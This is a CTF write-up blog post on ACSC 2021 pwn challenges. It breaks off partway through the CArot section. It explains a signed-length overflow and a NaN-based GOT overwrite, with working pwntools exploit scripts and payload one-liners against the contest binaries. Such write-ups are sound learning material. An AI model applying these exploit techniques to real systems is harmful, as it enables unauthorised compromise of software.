<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>ACSC 2021 - Pwn challenges</title>
	
	<meta name="author" content="stdnoerr">

	<!-- Enable responsive viewport -->
	<meta name="viewport" content="width=device-width, initial-scale=1.0">

	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
	<!--[if lt IE 9]>
	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->

	<!-- Le styles -->
	<link href="/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
	<link href="/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
	<link href="/assets/resources/syntax/syntax.css" rel="stylesheet">
	<link href="/assets/css/style.css" rel="stylesheet">

	<!-- Le fav and touch icons -->
	<!-- Update these with your own images
	<link rel="shortcut icon" href="images/favicon.ico">
	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
	-->

	<link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">
</head>

<body>
	<nav class="navbar navbar-default visible-xs" role="navigation">
		<!-- Brand and toggle get grouped for better mobile display -->
		<div class="navbar-header">
			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
				<span class="sr-only">Toggle navigation</span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
			</button>
			
			<a type="button" class="navbar-toggle nav-link" href="http://github.com/stdnoerr">
				<i class="fa fa-github"></i>
			</a>
			
			
			<a type="button" class="navbar-toggle nav-link" href="http://twitter.com/stdnoerr">
				<i class="fa fa-twitter"></i>
			</a>
			
			
			<a type="button" class="navbar-toggle nav-link" href="mailto:stdnoerr@gmail.com">
				<i class="fa fa-envelope"></i>
			</a>
			
			<a class="navbar-brand" href="/">
				<img src="//www.gravatar.com/avatar/fe66ffe3df09aee77973014c55d36d1c?s=35" class="img-circle" />
				stdnoerr's blog
			</a>
		</div>

		<!-- Collect the nav links, forms, and other content for toggling -->
		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
			<ul class="nav navbar-nav">
				<li class="active"><a href="/">Home</a></li>
				<li><a href="/categories.html">Categories</a></li>
				<li><a href="/tags.html">Tags</a></li>
			</ul>
		</div><!-- /.navbar-collapse -->
	</nav>

	<!-- nav-menu-dropdown -->
	<div class="btn-group hidden-xs" id="nav-menu">
		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
			<i class="fa fa-bars"></i>
		</button>
		<ul class="dropdown-menu" role="menu">
			<li><a href="/"><i class="fa fa-home"></i>Home</a></li>
			<li><a href="/categories.html"><i class="fa fa-folder"></i>Categories</a></li>
			<li><a href="/tags.html"><i class="fa fa-tags"></i>Tags</a></li>
			<li class="divider"></li>
			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
		</ul>
	</div>

	<div class="col-sm-3 sidebar hidden-xs" style="background: url(/assets/media/cover.jpg) no-repeat !important;">
		<!-- sidebar.html -->
<header class="sidebar-header" role="banner">
	<a href="/">
		<img src="//www.gravatar.com/avatar/fe66ffe3df09aee77973014c55d36d1c?s=150" class="img-circle" />
	</a>
	<h3 class="title">
        <a href="/">stdnoerr's blog</a>
    </h3>
</header>


<div id="bio" class="text-center">
	CTFer | pwner | wanna learn everything
</div>


<div id="contact-list" class="text-center">
	<ul class="list-unstyled list-inline">
		
		<li>
			<a class="btn btn-default btn-sm" href="https://github.com/stdnoerr">
				<i class="fa fa-github-alt fa-lg"></i>
			</a>
		</li>
		
		
		<li>
			<a class="btn btn-default btn-sm" href="https://twitter.com/stdnoerr">
				<i class="fa fa-twitter fa-lg"></i>
			</a>
		</li>
		
		
		<li>
			<a class="btn btn-default btn-sm" href="mailto:stdnoerr@gmail.com">
				<i class="fa fa-envelope fa-lg"></i>
			</a>
		</li>
		
	</ul>
	<ul id="contact-list-secondary" class="list-unstyled list-inline">
		
		
	</ul>
</div>
<!-- sidebar.html end -->

	</div>

	<div class="col-sm-9 col-sm-offset-3">
		<div class="page-header">
  <h1>ACSC 2021 - Pwn challenges </h1>
</div>
	
<article>

	<div class="col-sm-10">
	 <span class="post-date">
	   
	   September 
	   19th,
	   
	   2021
	 </span>
	  <div class="article_body">
	  <p>I played ACSC this year. I only tried pwn challenges and was able to solve all pwn except Message Center. The challenges were pretty awesome and had new things to learn. I really enjoyed it. Here are writeups for the ones I solved.</p>

<h1 id="filtered---100-pts---168-solves">Filtered - 100 pts - 168 solves</h1>
<p>The relevant parts of challenge source are below:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Call this function! */</span>
<span class="kt">void</span> <span class="nf">win</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
  <span class="n">execve</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">args</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">void</span> <span class="nf">readline</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">msg</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
<span class="p">[</span><span class="n">redacted</span><span class="p">]</span>

<span class="cm">/* Print `msg` and read an integer value */</span>
<span class="kt">int</span> <span class="n">readint</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">msg</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x10</span><span class="p">];</span>
  <span class="n">readline</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">atoi</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
<span class="p">}</span>

<span class="cm">/* Entry point! */</span>
<span class="kt">int</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="kt">int</span> <span class="n">length</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>

  <span class="cm">/* Read and check length */</span>
  <span class="n">length</span> <span class="o">=</span> <span class="n">readint</span><span class="p">(</span><span class="s">"Size: "</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">length</span> <span class="o">&gt;</span> <span class="mh">0x100</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">print</span><span class="p">(</span><span class="s">"Buffer overflow detected!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="cm">/* Read data */</span>
  <span class="n">readline</span><span class="p">(</span><span class="s">"Data: "</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
  <span class="n">print</span><span class="p">(</span><span class="s">"Bye!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Looking at the source reveals that there is a <code class="language-plaintext highlighter-rouge">win</code> function to get the flag. So we just need to somehow call this function.
In <code class="language-plaintext highlighter-rouge">main</code>, the program reads an <code class="language-plaintext highlighter-rouge">int</code> (length) then checks if it is greater than <code class="language-plaintext highlighter-rouge">0x100</code>, if it is then exits; otherwise reads that many bytes in <code class="language-plaintext highlighter-rouge">buf</code> buffer of size <code class="language-plaintext highlighter-rouge">0x100</code>.<br />
The issue here is that whenever bounds checks are to be done, <code class="language-plaintext highlighter-rouge">unsigned</code> variables must be used. But, the program uses <code class="language-plaintext highlighter-rouge">signed</code> variables for the bounds check. This becomes a security issue because giving a negative number passes the check and the <code class="language-plaintext highlighter-rouge">readline</code> function interprets the length as an <code class="language-plaintext highlighter-rouge">unsigned</code> value. Hence, reads a large number of bytes are read into the <code class="language-plaintext highlighter-rouge">buf</code> buffer.<br />
Let’s take a look at the protections on the binary.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
</code></pre></div></div>
<p>No canary and PIE is disabled. So, we can do a simple <code class="language-plaintext highlighter-rouge">ret2win</code> by giving a negative number. I chose <code class="language-plaintext highlighter-rouge">-1</code> for maximum bytes.<br />
Just calculate the offset upto RIP and put address of <code class="language-plaintext highlighter-rouge">win</code> and you get the flag.</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">p</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'filtered.chal.acsc.asia'</span><span class="p">,</span> <span class="mi">9001</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./filtered'</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
<span class="n">start</span><span class="p">()</span>

<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="s">'-1'</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mi">280</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">win</span><span class="p">))</span>

<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div>

<p>Flag: <code class="language-plaintext highlighter-rouge">ACSC{GCC_d1dn'7_sh0w_w4rn1ng_f0r_1mpl1c17_7yp3_c0nv3rs10n}</code></p>

<h1 id="histogram---200-pts---38-solves">Histogram - 200 pts - 38 solves</h1>
<p>Relevant source code below:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="n">redacted</span><span class="p">]</span>
<span class="kt">int</span> <span class="n">map</span><span class="p">[</span><span class="n">WSIZE</span><span class="p">][</span><span class="n">HSIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<span class="kt">int</span> <span class="n">wsum</span><span class="p">[</span><span class="n">WSIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<span class="kt">int</span> <span class="n">hsum</span><span class="p">[</span><span class="n">HSIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

<span class="cm">/* Call this function to get the flag! */</span>
<span class="kt">void</span> <span class="nf">win</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
  <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
  <span class="kt">int</span> <span class="n">n</span> <span class="o">=</span> <span class="n">fread</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">flag</span><span class="p">),</span> <span class="n">fp</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">flag</span><span class="p">);</span>
  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">read_data</span><span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span> <span class="p">{</span>
  <span class="cm">/* Read data */</span>
  <span class="kt">double</span> <span class="n">weight</span><span class="p">,</span> <span class="n">height</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">n</span> <span class="o">=</span> <span class="n">fscanf</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="s">"%lf,%lf"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">weight</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">height</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span> <span class="cm">/* End of data */</span>
  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span>
    <span class="n">fatal</span><span class="p">(</span><span class="s">"Invalid input"</span><span class="p">);</span>

  <span class="cm">/* Validate input */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">weight</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">.</span><span class="mi">0</span> <span class="o">||</span> <span class="n">weight</span> <span class="o">&gt;=</span> <span class="n">WEIGHT_MAX</span><span class="p">)</span>
    <span class="n">fatal</span><span class="p">(</span><span class="s">"Invalid weight"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">height</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">.</span><span class="mi">0</span> <span class="o">||</span> <span class="n">height</span> <span class="o">&gt;=</span> <span class="n">HEIGHT_MAX</span><span class="p">)</span>
    <span class="n">fatal</span><span class="p">(</span><span class="s">"Invalid height"</span><span class="p">);</span>

  <span class="cm">/* Store to map */</span>
  <span class="kt">short</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">;</span>
  <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="kt">short</span><span class="p">)</span><span class="n">ceil</span><span class="p">(</span><span class="n">weight</span> <span class="o">/</span> <span class="n">WEIGHT_STRIDE</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// WEIGHT_STRIDE = 10</span>
  <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="kt">short</span><span class="p">)</span><span class="n">ceil</span><span class="p">(</span><span class="n">height</span> <span class="o">/</span> <span class="n">HEIGHT_STRIDE</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// HEIGHT_STRIDE = 10</span>
  
  <span class="n">map</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span><span class="o">++</span><span class="p">;</span>
  <span class="n">wsum</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">++</span><span class="p">;</span>
  <span class="n">hsum</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="o">++</span><span class="p">;</span>

  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">[</span><span class="n">redacted</span><span class="p">]</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span>
    <span class="n">fatal</span><span class="p">(</span><span class="s">"No input file"</span><span class="p">);</span>

  <span class="cm">/* Open CSV */</span>
  <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">"r"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="n">fatal</span><span class="p">(</span><span class="s">"Cannot open the file"</span><span class="p">);</span>

  <span class="cm">/* Read data from the file */</span>
  <span class="kt">int</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">while</span> <span class="p">(</span><span class="n">read_data</span><span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">++</span><span class="n">n</span> <span class="o">&gt;</span> <span class="n">SHRT_MAX</span><span class="p">)</span>
      <span class="n">fatal</span><span class="p">(</span><span class="s">"Too many input"</span><span class="p">);</span>
<span class="p">[</span><span class="n">redacted</span><span class="p">]</span>
<span class="p">}</span>
</code></pre></div></div>
<p>This program also has a <code class="language-plaintext highlighter-rouge">win</code> function. We just need a way to execute it.<br />
The program basically reads the Comma-separated-values (CSV) file given as first argument, reads the values, perform some checks and increments the relevant point in the map for the <code class="language-plaintext highlighter-rouge">weight,height</code> values for making a histogram. <code class="language-plaintext highlighter-rouge">weight</code> and <code class="language-plaintext highlighter-rouge">height</code> are read as floats. The program does not have a vulnerability.<br />
The issue actually appears due to a special feature. The floats are defined by <a href="https://en.wikipedia.org/wiki/IEEE_754">IEEE-754</a> standard. This standard defines some special values. Namely: <code class="language-plaintext highlighter-rouge">NaN</code> (Not-a-Number), <code class="language-plaintext highlighter-rouge">inf</code>, <code class="language-plaintext highlighter-rouge">-inf</code> (infinities) and <code class="language-plaintext highlighter-rouge">-0</code>.<br />
We can try using these special values to see how the program behaves.<br />
Using <code class="language-plaintext highlighter-rouge">-0</code> works same as <code class="language-plaintext highlighter-rouge">0</code> and fails the check. Trying <code class="language-plaintext highlighter-rouge">inf</code> and <code class="language-plaintext highlighter-rouge">-inf</code> doesn’t pass the checks either.<br />
But, <code class="language-plaintext highlighter-rouge">NaN</code> is special. The standard defines interesting properties for it. The most interesting are the comparisons. Whenever <code class="language-plaintext highlighter-rouge">NaN</code> is compared to a number-like variable, the comparison evaluates to <code class="language-plaintext highlighter-rouge">False</code>. Even <code class="language-plaintext highlighter-rouge">NaN == NaN</code> is not true.<br />
So, using <code class="language-plaintext highlighter-rouge">NaN,1</code> passes the check. Its value is actually <code class="language-plaintext highlighter-rouge">0x80000000</code>. After all the arithmetic, it becomes <code class="language-plaintext highlighter-rouge">0x7fffffff</code> and lands us at <code class="language-plaintext highlighter-rouge">0x404028</code> which is GOT for <code class="language-plaintext highlighter-rouge">fread</code>. Increasing <code class="language-plaintext highlighter-rouge">height</code> by multilples of ten lets us move across the GOT and, hence, increment any GOT value.<br /> 
I decided to increment GOT of <code class="language-plaintext highlighter-rouge">fclose</code> because it is executed at end and has no occurences before that. So, the GOT will have a binary address. <code class="language-plaintext highlighter-rouge">NaN,30</code> lands us at GOT of <code class="language-plaintext highlighter-rouge">fclose</code>. I need to increment it <code class="language-plaintext highlighter-rouge">0x401268 - 0x401060 = 0x208</code> times. I created <code class="language-plaintext highlighter-rouge">exploit.csv</code> using the following one-liner.</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">open</span><span class="p">(</span><span class="s">'exploit.csv'</span><span class="p">,</span> <span class="s">'w+'</span><span class="p">).</span><span class="n">write</span><span class="p">(</span><span class="s">'NaN,30</span><span class="se">\n</span><span class="s">'</span><span class="o">*</span><span class="mh">0x208</span><span class="p">)</span>
</code></pre></div></div>
<p>The website had some issues so I used the following python script to send the file.</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">'https://histogram.chal.acsc.asia/api/histogram'</span><span class="p">,</span> <span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s">"csv"</span> <span class="p">:</span> <span class="nb">open</span><span class="p">(</span><span class="s">"exploit.csv"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)},</span> <span class="n">verify</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
</code></pre></div></div>
<p>Flag: <code class="language-plaintext highlighter-rouge">ACSC{NaN_demo_iiyo}</code></p>

<h1 id="carot---320-pts---18-solves">CArot - 320 pts - 18 solves</h1>
<p>Relevant code below:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="n">redacted</span><span class="p">]</span>
<span class="kt">char</span> <span class="n">gif</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
  <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> 
  <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x3b</span>
<span class="p">};</span>
<span class="p">[</span><span class="n">redacted</span><span class="p">]</span>

<span class="cp">#define BUFFERSIZE 512
</span>
<span class="kt">char</span><span class="o">*</span> <span class="nf">http_receive_request</span><span class="p">()</span> <span class="p">{</span>
  <span class="kt">long</span> <span class="kt">long</span> <span class="kt">int</span> <span class="n">read_limit</span> <span class="o">=</span> <span class="mi">4096</span><span class="p">;</span>

  <span class="n">connect_mode</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="n">BUFFERSIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>
  <span class="n">scanf</span><span class="p">(</span><span class="s">"%[^</span><span class="se">\n</span><span class="s">]"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
  <span class="n">getchar</span><span class="p">();</span>
  
  <span class="k">if</span> <span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="s">"GET "</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
  
  <span class="kt">int</span> <span class="n">n</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
  <span class="n">read_limit</span> <span class="o">-=</span> <span class="n">n</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">&lt;</span> <span class="mi">9</span><span class="p">)</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>

  <span class="kt">char</span><span class="o">*</span> <span class="n">tail</span> <span class="o">=</span> <span class="n">buffer</span> <span class="o">+</span> <span class="n">n</span><span class="o">-</span><span class="mi">9</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">tail</span><span class="p">,</span> <span class="s">" HTTP/1.0"</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> 
      <span class="n">memcmp</span><span class="p">(</span><span class="n">tail</span><span class="p">,</span> <span class="s">" HTTP/1.1"</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>

  <span class="o">*</span><span class="n">tail</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">strdup</span><span class="p">(</span><span class="n">buffer</span><span class="o">+</span><span class="mi">4</span><span class="p">);</span>
  <span class="o">*</span><span class="n">tail</span> <span class="o">=</span> <span class="sc">' '</span><span class="p">;</span>

  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">"%[^</span><span class="se">\n</span><span class="s">]"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
    <span class="n">getchar</span><span class="p">();</span>
    
    <span class="kt">int</span> <span class="n">n</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
<span class="p">[</span><span class="n">redacted</span><span class="p">]</span>

<span class="kt">int</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span><span class="o">*</span> <span class="n">fname</span> <span class="o">=</span> <span class="n">http_receive_request</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">fname</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">http_send_reply_bad_request</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="n">try_http_send_reply_with_file</span><span class="p">(</span><span class="n">fname</span><span class="p">);</span>
      <span class="n">free</span><span class="p">(</span><span class="n">fname</span><span class="p">);</span> 
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">connect_mode</span> <span class="o">!=</span> <span class="n">KEEP_ALIVE</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Analyzing the source reveals that this is something like a webserver. The upcoming request should be a <code class="language-plaintext highlighter-rouge">GET</code> request and must have either <code class="language-plaintext highlighter-rouge">HTTP/1.0</code> or <code class="language-plaintext highlighter-rouge">HTTP/1.1</code> at end. The path is stored in <code class="language-plaintext highlighter-rouge">buffer</code> of size <code class="language-plaintext highlighter-rouge">512</code> bytes. But, bytes are read using <code class="language-plaintext highlighter-rouge">scanf("%[^\n]", buffer);</code>. This <code class="language-plaintext highlighter-rouge">scanf</code> is bounds-unaware and reads bytes until it receives a null byte. This effectively imitates the notorious <code class="language-plaintext highlighter-rouge">gets</code> function except that it leaves the newline in the stream. Hence, a buffer overflow vulnerability. Then it reads some other headers, but this can be skipped using a simple newline.<br />
This program does not have a <code class="language-plaintext highlighter-rouge">win</code> function, so we need some other primitive to read the flag.<br />
One thing to note about this challenge is that we don’t have direct interaction with the binary. Following script works as a proxy between us and the binary.</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">stdin</span><span class="p">,</span> <span class="n">stdout</span><span class="p">,</span> <span class="nb">exit</span>
<span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">LIMIT</span> <span class="o">=</span> <span class="mi">4096</span>

<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span>
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
  <span class="n">s</span> <span class="o">=</span> <span class="n">stdin</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="n">readline</span><span class="p">()</span>
  <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span>

  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">LIMIT</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'You are too greedy'</span><span class="p">)</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

  <span class="k">if</span> <span class="n">s</span> <span class="o">==</span> <span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">:</span>
    <span class="k">break</span>

